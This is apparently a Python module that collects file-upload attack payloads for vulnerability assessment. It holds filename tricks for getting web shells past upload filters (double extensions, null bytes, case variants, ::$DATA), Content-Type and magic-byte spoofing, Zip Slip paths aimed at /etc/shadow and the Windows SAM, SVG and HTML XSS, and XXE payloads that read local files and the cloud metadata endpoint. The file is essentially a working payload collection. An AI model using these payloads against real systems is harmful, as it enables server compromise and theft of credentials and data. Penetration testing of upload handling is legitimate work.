"""
File Upload Vulnerability Payloads for Generic Vulnerability Assessment
"""

from typing import List, Dict, Any


# Extension bypass - Double extensions
DOUBLE_EXTENSION_PAYLOADS: List[str] = [
    "shell.php.jpg", "shell.php.png", "shell.php.gif", "shell.jpg.php",
    "shell.png.php", "shell.gif.php", "shell.php.jpeg", "shell.php.bmp",
    "shell.php.svg", "shell.php.pdf", "shell.asp.jpg", "shell.aspx.png",
    "shell.jpg.asp", "shell.jsp.jpg", "shell.jspx.png", "shell.jpg.jsp",
    "shell.py.jpg", "shell.rb.png", "shell.pl.gif", "shell.cgi.jpg",
]

# Null byte injection
NULL_BYTE_PAYLOADS: List[str] = [
    "shell.php%00.jpg", "shell.php%00.png", "shell.php%00.gif",
    "shell.asp%00.jpg", "shell.jsp%00.png", "shell.php;.jpg",
    "shell.php%0a.jpg", "shell.php%0d.jpg", "shell.php%09.jpg",
    "shell.php%20.jpg",
]

# Case variations
CASE_VARIATION_PAYLOADS: List[str] = [
    "shell.PHP", "shell.Php", "shell.pHp", "shell.phP", "shell.PHp",
    "shell.pHP", "shell.PhP", "shell.phtml", "shell.PHTML", "shell.pHtMl",
    "shell.php3", "shell.php4", "shell.php5", "shell.php7", "shell.pht",
    "shell.phar", "shell.phps", "shell.pgif", "shell.shtml",
    "shell.ASP", "shell.Asp", "shell.aSp", "shell.asP", "shell.ASPX",
    "shell.Aspx", "shell.asa", "shell.cer", "shell.cdx",
    "shell.JSP", "shell.Jsp", "shell.jSp", "shell.jsP", "shell.JSPX", "shell.jspf",
]

# Special character bypass
SPECIAL_CHAR_PAYLOADS: List[str] = [
    "shell.php.", "shell.php..", "shell.php...", "shell.php ",
    "shell.php/", "shell.php%20", "shell.p%68p", "shell.%70hp",
    "shell.ph%70", "shell.php::$DATA", "shell.php::$DATA.jpg",
    "shell.php:jpg", "shell..php", "....shell.php", "shell.php....",
    "shell.php/.", "./shell.php", "../shell.php", "shell.php%2f", "shell.php%5c",
]

# Content-Type bypass
CONTENT_TYPE_BYPASS: List[Dict[str, str]] = [
    {"filename": "shell.php", "content_type": "image/jpeg"},
    {"filename": "shell.php", "content_type": "image/png"},
    {"filename": "shell.php", "content_type": "image/gif"},
    {"filename": "shell.phtml", "content_type": "image/jpeg"},
    {"filename": "shell.php5", "content_type": "image/png"},
    {"filename": "shell.asp", "content_type": "image/jpeg"},
    {"filename": "shell.aspx", "content_type": "image/png"},
    {"filename": "shell.jsp", "content_type": "image/gif"},
    {"filename": "shell.php", "content_type": "application/octet-stream"},
    {"filename": "shell.php", "content_type": "text/plain"},
    {"filename": "shell.php", "content_type": "text/html"},
    {"filename": "shell.php", "content_type": ""},
    {"filename": "shell.php", "content_type": "image"},
    {"filename": "shell.php", "content_type": "image/"},
]

# Magic byte configs
MAGIC_BYTE_SHELL_CONFIGS: List[Dict[str, str]] = [
    {"name": "gif_php", "magic": "GIF89a", "extension": ".gif.php"},
    {"name": "jpeg_php", "magic_hex": "FFD8FFE0", "extension": ".jpg.php"},
    {"name": "png_php", "magic_hex": "89504E47", "extension": ".png.php"},
    {"name": "pdf_php", "magic": "%PDF-1.4", "extension": ".pdf.php"},
    {"name": "bmp_php", "magic": "BM", "extension": ".bmp.php"},
]

# Zip Slip payloads
ZIP_SLIP_PAYLOADS: List[str] = [
    "../../../etc/passwd", "../../../etc/shadow", "../../../tmp/shell.php",
    "../../../var/www/html/shell.php", "../../../../tmp/malicious.sh",
    "..\\..\\..\\Windows\\System32\\config\\SAM",
    "..\\..\\..\\inetpub\\wwwroot\\shell.aspx",
    "..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5cWindows%5cSystem32",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "../../../etc/passwd%00.jpg",
    "/etc/passwd", "/tmp/shell.php", "C:\\inetpub\\wwwroot\\shell.aspx",
]

# SVG XSS
SVG_XSS_PAYLOADS: List[str] = [
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">',
    '<svg><script>alert(document.domain)</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><circle onclick="alert(1)"/></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(1)"/></svg>',
]

# XML XXE
XML_XXE_PAYLOADS: List[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
]

# HTML payloads
HTML_PAYLOADS: List[str] = [
    '<html><body><script>alert(document.domain)</script></body></html>',
    '<html><body><iframe src="javascript:alert(1)"></iframe></body></html>',
    '<html><body onload="alert(1)"></body></html>',
]

# Filename attacks
LONG_FILENAME_PAYLOADS: List[str] = ["A" * 200 + ".php", "A" * 255 + ".php"]

RESERVED_FILENAME_PAYLOADS: List[str] = [
    "CON.php", "PRN.php", "AUX.php", "NUL.php", "COM1.php", "LPT1.php",
    ".htaccess", ".htpasswd", "web.config", ".user.ini", "php.ini",
]

FILENAME_TRAVERSAL_PAYLOADS: List[str] = [
    "../shell.php", "..\\shell.php", "....//shell.php", "..%2fshell.php",
    "..%5cshell.php", "%2e%2e%2fshell.php", "..%252fshell.php",
    "/var/www/html/shell.php", "C:\\inetpub\\wwwroot\\shell.php",
]

# Upload parameter names
UPLOAD_PARAMETER_NAMES: List[str] = [
    "file", "upload", "image", "photo", "picture", "avatar",
    "attachment", "document", "doc", "pdf", "img", "media",
    "fileUpload", "imageUpload", "uploadFile", "fileInput",
    "files[]", "images[]", "attachments[]", "documents[]",
    "profilePic", "coverPhoto", "thumbnail", "icon", "logo",
]


def get_upload_detection_patterns() -> List[str]:
    return [
        r"upload.*success", r"file.*saved", r"image.*uploaded",
        r"invalid.*extension", r"file.*type.*not.*allowed",
        r"/var/www/", r"/tmp/", r"htdocs", r"wwwroot",
        r"<\\?php", r"Parse error", r"uid=\\d+",
    ]


def get_upload_payload_summary() -> Dict[str, int]:
    return {
        "double_extension": len(DOUBLE_EXTENSION_PAYLOADS),
        "null_byte": len(NULL_BYTE_PAYLOADS),
        "case_variation": len(CASE_VARIATION_PAYLOADS),
        "special_char": len(SPECIAL_CHAR_PAYLOADS),
        "content_type_bypass": len(CONTENT_TYPE_BYPASS),
        "magic_byte_configs": len(MAGIC_BYTE_SHELL_CONFIGS),
        "zip_slip": len(ZIP_SLIP_PAYLOADS),
        "svg_xss": len(SVG_XSS_PAYLOADS),
        "xml_xxe": len(XML_XXE_PAYLOADS),
        "html_payloads": len(HTML_PAYLOADS),
        "long_filename": len(LONG_FILENAME_PAYLOADS),
        "reserved_filename": len(RESERVED_FILENAME_PAYLOADS),
        "filename_traversal": len(FILENAME_TRAVERSAL_PAYLOADS),
        "upload_params": len(UPLOAD_PARAMETER_NAMES),
        "total_payloads": (
            len(DOUBLE_EXTENSION_PAYLOADS) + len(NULL_BYTE_PAYLOADS) +
            len(CASE_VARIATION_PAYLOADS) + len(SPECIAL_CHAR_PAYLOADS) +
            len(CONTENT_TYPE_BYPASS) + len(MAGIC_BYTE_SHELL_CONFIGS) +
            len(ZIP_SLIP_PAYLOADS) + len(SVG_XSS_PAYLOADS) +
            len(XML_XXE_PAYLOADS) + len(HTML_PAYLOADS) +
            len(LONG_FILENAME_PAYLOADS) + len(RESERVED_FILENAME_PAYLOADS) +
            len(FILENAME_TRAVERSAL_PAYLOADS)
        ),
    }


__all__ = [
    "DOUBLE_EXTENSION_PAYLOADS", "NULL_BYTE_PAYLOADS", "CASE_VARIATION_PAYLOADS",
    "SPECIAL_CHAR_PAYLOADS", "CONTENT_TYPE_BYPASS", "MAGIC_BYTE_SHELL_CONFIGS",
    "ZIP_SLIP_PAYLOADS", "SVG_XSS_PAYLOADS", "XML_XXE_PAYLOADS", "HTML_PAYLOADS",
    "LONG_FILENAME_PAYLOADS", "RESERVED_FILENAME_PAYLOADS", "FILENAME_TRAVERSAL_PAYLOADS",
    "UPLOAD_PARAMETER_NAMES", "get_upload_detection_patterns", "get_upload_payload_summary",
]
